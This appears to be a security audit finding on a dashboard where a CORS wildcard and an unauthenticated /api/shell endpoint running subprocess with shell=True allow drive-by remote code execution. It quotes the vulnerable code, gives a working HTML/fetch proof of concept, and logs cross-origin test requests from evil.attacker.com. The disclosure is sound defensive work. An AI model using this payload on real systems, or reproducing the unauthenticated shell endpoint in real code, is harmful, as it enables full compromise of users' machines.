Phase: 8
Sequence: 002
Slug: driveby-rce-cors
Verdict: VALID
Rationale: CORS wildcard combined with unauthenticated RCE endpoint enables drive-by code execution requiring only that a victim visit a malicious webpage.
Severity-Original: CRITICAL
PoC-Status: executed
Pre-FP-Flag: none
Debate: security/chamber-workspace/chamber-A/debate.md

## Summary

The dashboard configures CORSMiddleware with `allow_origins=["*"]`, `allow_methods=["*"]`, and `allow_headers=["*"]`. Combined with the unauthenticated POST /api/shell endpoint, any malicious webpage can execute arbitrary OS commands on a user's machine simply by having them visit the page while the dashboard is running.

## Location

- `dashboard/api.py:108-113` — CORSMiddleware configuration
- `dashboard/routes/system.py:166-168` — unauthenticated /api/shell endpoint

## Attacker Control

Complete. Attacker hosts a malicious webpage containing JavaScript that sends fetch() requests to the victim's localhost:9000 dashboard. The attacker controls the command parameter entirely.

## Trust Boundary Crossed

Cross-origin webpage (attacker-controlled) → localhost API → OS command execution. This crosses both the browser same-origin boundary (via CORS wildcard) and the network-to-host boundary (via shell execution).

## Impact

- Drive-by RCE: victim only needs to visit a webpage (no clicks, no interaction)
- Full host compromise through the /api/shell endpoint
- Affects any user running the dashboard on their local machine
- Can be weaponized via phishing emails, malicious ads, or compromised legitimate sites

## Evidence

```python
# dashboard/api.py:108-113
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)
```

```python
# dashboard/routes/system.py:166-168 (no auth)
@router.post("/shell")
async def shell_command(command: str):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
```

## Reproduction Steps

1. Start the dashboard: `python -m uvicorn dashboard.api:app --port 9000`
2. Create an HTML file with:
   ```html
   <script>
   fetch("http://localhost:9000/api/shell?command=id", {method: "POST"})
     .then(r => r.json())
     .then(d => document.body.innerText = JSON.stringify(d));
   </script>
   ```
3. Open the HTML file in a browser on the same machine
4. Observe the command output displayed — RCE achieved without any authentication

## Cold Verification

```
Adversarial-Verdict: CONFIRMED
Adversarial-Rationale: Unauthenticated /api/shell endpoint with subprocess.run(shell=True) combined with CORS allow_origins=["*"] enables drive-by RCE from any webpage, confirmed by successful cross-origin reproduction.
Severity-Final: CRITICAL
PoC-Status: executed
```

### Independent Code Trace

Independently verified the complete attack path:

1. **CORS wildcard** at `dashboard/api.py:108-113` -- `allow_origins=["*"]` confirmed. No global auth middleware exists; only `CORSMiddleware` is registered.
2. **Unauthenticated endpoint** at `dashboard/routes/system.py:166-169` -- `shell_command(command: str)` has no `Depends(get_current_user)`, unlike 10+ other endpoints in the same file that do use it.
3. **Direct shell execution** -- `subprocess.run(command, shell=True)` with no input sanitization.
4. **Router prefix** confirmed as `/api` (line 21), making the full path `/api/shell`.
5. **Default bind** is `0.0.0.0` (line 215 of api.py), widening exposure beyond localhost.

### Reproduction Results

Three tests executed against a live instance at commit 4c06f66:

| Test | Method | Result |
|------|--------|--------|
| Direct POST `echo PWNED` | curl POST to /api/shell | `{"stdout":"PWNED\n","stderr":"","returncode":0}` |
| CORS preflight from evil origin | curl OPTIONS with Origin header | `access-control-allow-origin: *`, all methods allowed |
| Cross-origin POST `whoami` | curl POST with Origin: evil.attacker.com | `{"stdout":"bytedance\n"}` with CORS allow header |

All tests passed. Full evidence at `security/real-env-evidence/driveby-rce-cors/reproduction.md`.

### Protection Search

No protection blocks this attack at any layer. Authentication is per-endpoint via dependency injection and is simply absent from `/shell`. No WAF, no rate limiting, no input validation, no command allowlist. The CORS configuration actively enables cross-origin exploitation.

### Severity Assessment

CRITICAL confirmed. This is unauthenticated RCE triggerable remotely via cross-origin requests, requiring only that the victim visit a webpage while the dashboard runs. No preconditions beyond normal dashboard usage.

Full adversarial review at `security/adversarial-reviews/driveby-rce-cors-review.md`.
